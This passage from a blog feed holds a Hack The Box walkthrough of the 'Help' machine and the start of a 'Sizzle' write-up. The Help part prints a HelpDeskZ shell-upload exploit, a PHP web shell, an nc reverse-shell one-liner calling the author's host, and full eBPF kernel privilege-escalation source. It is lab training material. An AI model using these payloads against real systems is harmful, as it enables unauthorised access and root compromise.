&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-used-crackstation-to-crack-the-hash-and-got-this-password-&quot;&gt;I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack the hash and got this password :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;5d3c93182bb20f07b994a7f617e99cff&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;godhelpmeplz&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-have-the-credentials--helpmehelpmecom--godhelpmeplz&quot;&gt;Now we have the credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;helpme@helpme.com : godhelpmeplz&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;file-upload-exploitation-reverse-shell-and-user-flag&quot;&gt;File Upload Exploitation, Reverse Shell and User Flag&lt;/h3&gt;
&lt;h4 id=&quot;i-edited-the-path-of-the-uploads-in-the-exploit-instead-of-helpdeskzbaseurlmd5hashphp-i-made-it-helpdeskzbaseurluploadsticketsmd5hashphp-i-got-this-path-from-the-github-repository-exploit-after-edits-&quot;&gt;I edited the path of the uploads in the exploit, instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;helpdeskzBaseUrl+md5hash+'.php'&lt;/code&gt; I made it &lt;code class=&quot;highlighter-rouge&quot;&gt;helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'&lt;/code&gt; (I got this path from the &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0&quot;&gt;github repository&lt;/a&gt;). Exploit after edits :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) &amp;lt; 3:
    print &quot;Usage: {} [baseUrl] [nameOfUploadedFile]&quot;.format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print &quot;found!&quot;
        print url
        sys.exit(0)

print &quot;Sorry, I did not find anything&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-went-to-the-settings-and-changed-the-timezone-to-the-same-timezone-as-mine-&quot;&gt;I went to the settings and changed the timezone to the same timezone as mine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-php-file-im-going-to-upload-is-simple-backdoorphp-which-can-be-found-in-usrsharewebshellsphpsimple-backdoorphp-in-kali-&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file I’m going to upload is &lt;code class=&quot;highlighter-rouge&quot;&gt;simple-backdoor.php&lt;/code&gt; which can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/webshells/php/simple-backdoor.php&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;kali&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;

&amp;lt;?php

if(isset($_REQUEST['cmd'])){
        echo &quot;&amp;lt;pre&amp;gt;&quot;;
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo &quot;&amp;lt;/pre&amp;gt;&quot;;
        die;
}

?&amp;gt;

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

&amp;lt;!--    http://michaeldaw.org   2006    --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-submitted-the-ticket-&quot;&gt;I submitted the ticket :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-ran-the-exploit-and-it-found-the-file-immediately-&quot;&gt;Then I ran the exploit and it found the file immediately :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python exploit.py http://10.10.10.121/support/ rick.php&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/19.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=whoami&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-working-lets-get-a-reverse-shell-i-used-this-payload--rm-tmpfmkfifo-tmpfcat-tmpfbinsh--i-21nc-1010xxxx-1337-tmpf-url-encoded&quot;&gt;It’s working, let’s get a reverse shell, I used this payload : &lt;code class=&quot;highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f&lt;/code&gt; (url encoded)&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/help/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;kernel-exploit-privilege-escalation-and-root-flag&quot;&gt;Kernel Exploit, Privilege Escalation and Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;privilege-escalation-on-this-machine-was-very-easy-just-a-kernel-exploit-one-of-the-first-things-to-check-after-getting-a-shell-is-the-system-info-&quot;&gt;Privilege escalation on this machine was very easy, just a kernel exploit. One of the first things to check after getting a shell is the system info :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;that-kernel-version-is-vulnerable-to-a-local-privilege-escalation-vulnerability-and-theres-an-exploit-published-for-it&quot;&gt;That kernel version is vulnerable to a local privilege escalation vulnerability and there’s an &lt;a href=&quot;https://www.exploit-db.com/exploits/44298&quot;&gt;exploit&lt;/a&gt; published for it.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit.c&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;linux/bpf.h&amp;gt;
#include &amp;lt;linux/unistd.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;sys/un.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;

#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x5f8
#define UID_OFFSET 4
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328

int sockets[2];
int mapfd, progfd;

char *__prog = 	&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;
		&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;
		&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
		&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;
		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
		&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;
		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
		&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;
		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;
		&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;
		&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;;

char bpf_log_buf[LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version) {
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = (__u64)insns,
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = (__u64)license,
		.log_buf = (__u64)bpf_log_buf,
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &amp;amp;attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries) {
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &amp;amp;attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, uint64_t value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&amp;amp;key,
		.value = (__u64)&amp;amp;value,
		.flags = 0,
	};

	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;amp;attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)key,
		.value = (__u64)value,
	};

	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;amp;attr, sizeof(attr));
}

static void __exit(char *err) {
	fprintf(stderr, &quot;error: %s\n&quot;, err);
	exit(-1);
}

static void prep(void) {
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
	if (mapfd &amp;lt; 0)
		__exit(strerror(errno));

	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
			(struct bpf_insn *)__prog, PROGSIZE, &quot;GPL&quot;, 0);

	if (progfd &amp;lt; 0)
		__exit(strerror(errno));

	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
		__exit(strerror(errno));

	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;amp;progfd, sizeof(progfd)) &amp;lt; 0)
		__exit(strerror(errno));
}

static void writemsg(void) {
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n &amp;lt; 0) {
		perror(&quot;write&quot;);
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, &quot;short write: %lu\n&quot;, n);
}

#define __update_elem(a, b, c) \
	bpf_update_elem(0, (a)); \
	bpf_update_elem(1, (b)); \
	bpf_update_elem(2, (c)); \
	writemsg();

static uint64_t get_value(int key) {
	uint64_t value;

	if (bpf_lookup_elem(&amp;amp;key, &amp;amp;value))
		__exit(strerror(errno));

	return value;
}

static uint64_t __get_fp(void) {
	__update_elem(1, 0, 0);

	return get_value(2);
}

static uint64_t __read(uint64_t addr) {
	__update_elem(0, addr, 0);

	return get_value(2);
}

static void __write(uint64_t addr, uint64_t val) {
	__update_elem(2, addr, val);
}

static uint64_t get_sp(uint64_t addr) {
	return addr &amp;amp; ~(0x4000 - 1);
}

static void pwn(void) {
	uint64_t fp, sp, task_struct, credptr, uidptr;

	fp = __get_fp();
	if (fp &amp;lt; PHYS_OFFSET)
		__exit(&quot;bogus fp&quot;);
	
	sp = get_sp(fp);
	if (sp &amp;lt; PHYS_OFFSET)
		__exit(&quot;bogus sp&quot;);
	
	task_struct = __read(sp);

	if (task_struct &amp;lt; PHYS_OFFSET)
		__exit(&quot;bogus task ptr&quot;);

	printf(&quot;task_struct = %lx\n&quot;, task_struct);

	credptr = __read(task_struct + CRED_OFFSET); // cred

	if (credptr &amp;lt; PHYS_OFFSET)
		__exit(&quot;bogus cred ptr&quot;);

	uidptr = credptr + UID_OFFSET; // uid
	if (uidptr &amp;lt; PHYS_OFFSET)
		__exit(&quot;bogus uid ptr&quot;);

	printf(&quot;uidptr = %lx\n&quot;, uidptr);
	__write(uidptr, 0); // set both uid and gid to 0

	if (getuid() == 0) {
		printf(&quot;spawning root shell\n&quot;);
		system(&quot;/bin/bash&quot;);
		exit(0);
	}

	__exit(&quot;not vulnerable?&quot;);
}

int main(int argc, char **argv) {
	prep();
	pwn();

	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-a-python-server-to-host-the-exploit-then-i-downloaded-it-on-the-box-&quot;&gt;I ran a python server to host the exploit then I downloaded it on the box :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-compiled-the-exploit-and-ran-it-&quot;&gt;Then I compiled the exploit and ran it :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o exploit exploit.c&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---sizzle&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/sizzle/&quot;&gt;Hack The Box - Sizzle&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - FluJab&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="Python" /><category term="code analysis" /><summary type="html">Quick Summary Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called HelpDeskZ. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is 10.10.10.121 I added it to /etc/hosts as help.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC help.htb We got ssh on port 22 and http on two ports : 80 and 3000. What’s running on port 80 is an Apache2 server and on port 3000 is Node.js Express Framework. HTTP Initial Enumeration On port 80 there’s just the default Apache index page : So I ran gobuster and got these results : gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://help.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/06/07 13:03:25 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /support (Status: 301) ===================================================== 2019/06/07 13:05:25 Finished ===================================================== I went to /support and there was a web application called HelpDeskZ : File Upload Vulnerability A quick search and I found an unauthenticated file upload vulnerability that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload php files because they are allowed by default.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/help/0.png" /></entry><entry><title type="html">Hack The Box - Sizzle</title><link href="http://localhost:4000/hack-the-box/sizzle/" rel="alternate" type="text/html" title="Hack The Box - Sizzle" /><published>2019-06-01T00:00:00+02:00</published><updated>2019-06-01T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/sizzle</id><content type="html" xml:base="http://localhost:4000/hack-the-box/sizzle/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-sizzle-retired-and-heres-my-write-up-about-it-sizzle-was-a-great-machine-everything-about-it-was-great-it-was-very-realistic-fun-and-of-course-challenging-as-it-was-rated-insane-personally-one-of-my-favorites-and-one-of-the-best-active-directory-boxes-i-have-ever-solved-it-starts-by-getting-write-access-to-a-directory-in-an-smb-share-a-simple-scf-file-attack-with-responder-and-john-could-give-me-a-password-for-a-user-with-that-password-i-could-generate-a-certificate-request-and-get-a-certificate-then-a-winrm-session-after-that-comes-the-most-challenging-part-about-the-box-which-is-bypassing-antivirus-kerberoasting-and-privilege-escalation-but-before-doing-that-we-will-take-a-look-at-an-unintended-way-first-that-was-the-box-in-a-nutshell-its-a-windows-box-and-its-ip-is-101010103-i-added-it-to-etchosts-as-sizzlehtb-lets-jump-right-in-&quot;&gt;Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; share, a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file attack with &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; could give me a password for a user. With that password I could generate a certificate request and get a certificate then a &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.103&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;sizzle.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC sizzle.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/1.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb
Nmap scan report for sizzle.htb (10.10.10.103)
Host is up (0.15s latency).
Not shown: 987 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer
SF:sionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0
SF:4bind\0\0\x10\0\x03&quot;);
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5s, deviation: 0s, median: -6s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-05-31 19:44:44
|_  start_date: 2019-05-31 12:06:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 31 19:45:27 2019 -- 1 IP address (1 host up) scanned in 232.62 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-a-lot-of-ports-we-got-ftp-on-port-21-dns-on-port-53-http-on-port-80-smb-and-ldap-we-also-see-that-the-domain-is-htblocal-and-commonname-is-sizzlehtblocal-so-i-added-it-to-etchosts-&quot;&gt;We got a lot of ports, we got &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; on port 53, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt;. We also see that the domain is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTB.LOCAL&lt;/code&gt; and commonName is &lt;code class=&quot;highlighter-rouge&quot;&gt;sizzle.htb.local&lt;/code&gt;, so I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;anonymous-authentication-on-ftp-was-allowed-but-there-was-nothing-there-so-i-will-skip-that&quot;&gt;anonymous authentication on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; was allowed but there was nothing there so I will skip that.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-that-http-server-and-the-index-only-had-this-gif-&quot;&gt;I checked that &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; server and the index only had this &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-ran-gobuster-&quot;&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; :&lt;/h4&gt;
